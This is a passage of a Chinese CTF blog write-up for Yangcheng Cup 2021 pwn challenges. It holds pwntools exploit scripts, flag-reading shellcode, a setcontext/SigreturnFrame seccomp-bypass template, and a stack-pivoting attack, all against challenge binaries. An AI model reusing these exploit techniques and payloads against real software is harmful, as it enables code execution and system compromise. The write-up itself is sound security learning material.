+mov rdi<span class="token punctuation">,</span> rsp <span class="token punctuation">;</span><span class="token operator">//</span> <span class="token punctuation">.</span><span class="token operator">/</span>flag
+mov rsi<span class="token punctuation">,</span> <span class="token number">0</span> <span class="token punctuation">;</span><span class="token operator">//</span> O_RDONLY
+xor rdx<span class="token punctuation">,</span> rdx <span class="token punctuation">;</span>
+mov rax<span class="token punctuation">,</span> <span class="token number">2</span> <span class="token punctuation">;</span><span class="token operator">//</span> SYS_open
+syscall
+
+mov rdi<span class="token punctuation">,</span> rax <span class="token punctuation">;</span><span class="token operator">//</span> fd
+mov rsi<span class="token punctuation">,</span>rsp  <span class="token punctuation">;</span>
+mov rdx<span class="token punctuation">,</span> <span class="token number">1024</span> <span class="token punctuation">;</span><span class="token operator">//</span> nbytes
+mov rax<span class="token punctuation">,</span><span class="token number">0</span> <span class="token punctuation">;</span><span class="token operator">//</span> SYS_read
+syscall
+
+mov rdi<span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">;</span><span class="token operator">//</span> fd
+mov rsi<span class="token punctuation">,</span> rsp <span class="token punctuation">;</span><span class="token operator">//</span> buf
+mov rdx<span class="token punctuation">,</span> rax <span class="token punctuation">;</span><span class="token operator">//</span> count
+mov rax<span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">;</span><span class="token operator">//</span> SYS_write
+syscall
+
+mov rdi<span class="token punctuation">,</span> <span class="token number">0</span> <span class="token punctuation">;</span><span class="token operator">//</span> error_code
+mov rax<span class="token punctuation">,</span> <span class="token number">60</span>
+syscall<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这段shellcode使用orw的方法读取flag</p>
+<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>在构造之前，我们需要指定机器的运行模式。<code>context.arch = &#39;amd64&#39; 或 &#39;i386&#39;</code></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">frame <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>
+frame<span class="token punctuation">.</span>rip <span class="token operator">=</span> <span class="token number">0</span> <span class="token operator">//</span> setcontext之后执行的值
+frame<span class="token punctuation">.</span>rdi <span class="token operator">=</span> <span class="token number">0</span>
+frame<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0</span>
+frame<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0</span> <span class="token operator">//</span> <span class="token number">3</span>个参数
+frame<span class="token punctuation">.</span>rsp <span class="token operator">=</span> <span class="token number">0</span> <span class="token operator">//</span> rip执行完之后执行的值
+frame<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>一般利用方式:</p>
+<ol>
+<li>将<code>setcontext+53</code>写入<code>__free_hook</code>，<code>__free_hook+0x8</code>写入一个<code>__free_hook+0x10</code>，后面写<code>read;jmp rsi</code>的<code>shellcode</code>。</li>
+<li>构造<code>frame</code>，rip设置成<code>mprotect</code>，准备将<code>__free_hook&amp;0xfffffffffffff000</code>之后的连续0x1000区域权限设置成7。找一个堆块存放<code>frame</code>。</li>
+<li>释放存放<code>frame</code>的<code>chunk</code>，此时执行到<code>read</code>。</li>
+<li>将事先准备好的<code>getflag</code>的<code>shellcode</code>发送到服务器，即执行<code>shellcode</code>，得到flag。</li>
+</ol>
+<p>脚本模板:</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">newexe <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xfffffffffffff000</span>
+context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>
+shell1 <span class="token operator">=</span> <span class="token triple-quoted-string string">'''
+xor rdi,rdi
+mov rsi,%d
+mov edx,0x1000
+
+mov eax,0
+syscall
+
+jmp rsi
+'''</span> <span class="token operator">%</span> newexe
+frame <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>
+frame<span class="token punctuation">.</span>rsp <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">0x10</span>
+frame<span class="token punctuation">.</span>rdi <span class="token operator">=</span> newexe
+frame<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0x1000</span>
+frame<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">4</span> <span class="token operator">|</span> <span class="token number">2</span> <span class="token operator">|</span> <span class="token number">1</span>
+frame<span class="token punctuation">.</span>rip <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'mprotect'</span><span class="token punctuation">]</span>
+
+shell2 <span class="token operator">=</span> <span class="token triple-quoted-string string">'''
+mov rax,0x67616c662f
+push rax
+
+mov rdi,rsp
+mov rsi,0
+mov rdx,0
+mov rax,2
+syscall
+
+mov rdi,rax
+mov rsi,rsp
+mov rdx,1024
+mov rax,0
+syscall
+
+mov rdi,1
+mov rsi,rsp
+mov rdx,rax
+mov rax,1
+syscall
+
+mov rdi,0
+mov rax,60
+syscall
+'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>setcontext利用:</p>
+<p><a target="_blank" rel="noopener" href="https://surager.pub/_posts/2020-06-27-%E4%BB%8EDASCTF6%E6%9C%88%E8%B5%9B%E4%B8%AD%E5%AD%A6%E4%B9%A0setcontext%E7%BB%95%E8%BF%87seccomp/">从DASCTF6月赛中学习setcontext绕过seccomp · Surager</a></p>
+<p><a target="_blank" rel="noopener" href="http://wafuter.jxustctf.top/2020/06/27/DASCTF-pwn-%E5%A4%8D%E7%8E%B0/">DASCTF pwn 复现 | pwxc’s blog (jxustctf.top)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.codenong.com/cs105709145/">BUUCTF-PWN rctf_2019_babyheap（house of storm，堆SROP） | 码农家园 (codenong.com)</a></p>
+<h2 id="BabyRop"><a href="#BabyRop" class="headerlink" title="BabyRop"></a>BabyRop</h2><p>32位简单栈溢出,没啥好说的</p>
+<p>ret2text, 没有偏移且有system函数和bss段上有sh字符串</p>
+<p>直接运行system(sh) 即可getshell</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: UTF-8 -*-</span>
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>
+context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
+p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./BabyRop'</span><span class="token punctuation">)</span>
+<span class="token comment"># p = remote('192.168.38.235',11000)</span>
+
+payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x28</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x080491D6</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0xdeadbeaf</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x804C029</span><span class="token punctuation">)</span><span class="token comment">#sh字符串</span>
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="nologin"><a href="#nologin" class="headerlink" title="nologin"></a>nologin</h2><p>栈溢出 stack pivoting</p>
+<p>属于是基础不牢,比赛当天都没看出来漏洞实在是太low了(</p>
+<h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>在admin里read_passwd可以最多读入30个字节,而&amp;passwd在栈上只有0x5个字节</p>
+<p>存在栈溢出.且未开启NX保护</p>
+<p>但是栈溢出字节较少,考虑使用stack pivoting</p>
+<p>在栈上覆盖一个sys_read的系统调用,之后覆盖ret为jmp_rsp,之后就是写上jmp rsp之后执行的代码</p>
+<p>这里我们抬高rsp到前面的sys_read,在call sys_read</p>
+<p>执行sys_read之前修改rsi到sysread之后去方便执行orw</p>
+<h3 id="stack-pivoting"><a href="#stack-pivoting" class="headerlink" title="stack pivoting"></a>stack pivoting</h3><p>这里我们发现有一个可以直接跳转到 rsp 的 gadgets。那么可以布置 payload 如下</p>
+<pre class="line-numbers language-none"><code class="language-none">shellcode|padding|fake ebp|jmp_rsp|set rsp point to shellcode and jmp esp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>那么我们 payload 中的最后一部分改如何设置 rsp 呢，可以知道</p>
+<ul>
+<li>size(shellcode+padding+fake ebp)=13</li>
+<li>size(p64(jmp_rsp))=8</li>
+</ul>
+<p>所以我们最后一段需要执行的指令就是</p>
+<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">sub rsp,0x15
+jmp rsp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span>
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
+context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>
+p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./nologin"</span><span class="token punctuation">)</span>
+<span class="token comment"># libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')</span>
+
+jmp_rsp <span class="token operator">=</span> <span class="token number">0x004016fb</span> <span class="token comment"># jmp rsp</span>
+code1 <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">"""
+add rsi,0x31;
+push 0x70;
+pop rdx;
+xor rax,rax;
+syscall;
+"""</span><span class="token punctuation">)</span>
+
+sub_jmp_rsp<span class="token operator">=</span>asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">"""
+sub rsp,0x15;
+jmp rsp;
+"""</span><span class="token punctuation">)</span>
+
+payload <span class="token operator">=</span> code1<span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">,</span>asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>nop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>jmp_rsp<span class="token punctuation">)</span><span class="token operator">+</span>sub_jmp_rsp
+p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"input>"</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">password:"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+
+orw <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>nop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">10</span><span class="token operator">+</span>asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>cat<span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>orw<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/python2/" rel="tag"># python2</a>
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+              <a href="/tags/wp/" rel="tag"># wp</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/post/pwn-2021%E7%A5%A5%E4%BA%91%E6%9D%AFpwn%E9%A2%98%E5%A4%8D%E7%8E%B0.html" rel="prev" title="2021祥云杯pwn题复现">
+      <i class="fa fa-chevron-left"></i> 2021祥云杯pwn题复现
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/post/pwn-House-of-Einherjar.html" rel="next" title="pwn-House_of_Einherjar">
+      pwn-House_of_Einherjar <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#WP-%E7%BE%8A%E5%9F%8E%E6%9D%AF2021"><span class="nav-number">1.</span> <span class="nav-text">[WP]羊城杯2021</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#whatsyourname"><span class="nav-number">1.1.</span> <span class="nav-text">whatsyourname</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">1.1.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">1.1.2.</span> <span class="nav-text">exp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B3%E4%BA%8Esetcontext%E7%9A%84orw"><span class="nav-number">1.1.3.</span> <span class="nav-text">关于setcontext的orw</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">1.1.3.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8"><span class="nav-number">1.1.3.2.</span> <span class="nav-text">利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">1.1.4.</span> <span class="nav-text">参考</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BabyRop"><span class="nav-number">1.2.</span> <span class="nav-text">BabyRop</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#nologin"><span class="nav-number">1.3.</span> <span class="nav-text">nologin</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90-1"><span class="nav-number">1.3.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#stack-pivoting"><span class="nav-number">1.3.2.</span> <span class="nav-text">stack pivoting</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-1"><span class="nav-number">1.3.3.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Mark0519"
+      src="https://pic.imgdb.cn/item/5fbd287eb18d627113535cf8.png">
+  <p class="site-author-name" itemprop="name">Mark0519</p>
+  <div class="site-description" itemprop="description">菜鸡CTFer的自留地</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">65</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">21</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/mark0519" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;mark0519" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:sunjiajun@bupt.edu.cn" title="E-Mail → mailto:sunjiajun@bupt.edu.cn" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Mark0519</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
